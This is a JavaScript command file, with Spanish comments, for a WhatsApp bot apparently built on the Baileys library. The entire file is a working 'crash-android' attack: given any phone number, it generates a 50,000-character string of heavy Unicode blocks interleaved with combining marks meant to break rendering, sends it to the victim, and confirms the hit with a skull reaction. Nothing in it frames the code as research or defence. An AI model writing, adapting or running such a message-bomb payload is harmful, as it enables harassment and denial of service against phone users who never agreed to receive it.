/* * 👑 MISA CRASH-ANDROID - TRAvas System
 * Ruta: comandos/crash-android.js
 */

const handler = async (conn, m, { args, usedPrefix, command }) => {
    // Si no pone número, el bot le explica cómo usarlo
    if (!args[0]) return m.reply(`✧ ‧₊˚ *MISA CRASH* ୧ֹ˖\n\n> ✐ *Uso:* ${usedPrefix + command} [número]\n> 💡 *Ejemplo:* ${usedPrefix + command} 1809xxxxxxx`)
    
    // Limpiamos el número para que Baileys lo entienda
    let target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    // Generación de 50k Unicodes de alta entropía (bloques pesados)
    const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
    let cargaCrash = ""
    for (let i = 0; i < 50000; i++) {
        let bloque = bloques[i % bloques.length]
        cargaCrash += String.fromCodePoint(bloque + (i % 800))
        // Inyectamos el combinador vertical cada 8 caracteres para romper el scroll
        if (i % 8 === 0) cargaCrash += String.fromCodePoint(0x0345) 
    }

    // Enviamos el ataque al objetivo
    await conn.sendMessage(target, { text: cargaCrash })
    
    // Reaccionamos para confirmar que el bot disparó
    await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
}

// Aquí es donde definimos el nombre del comando
handler.command = ['crash-android']

export default handler
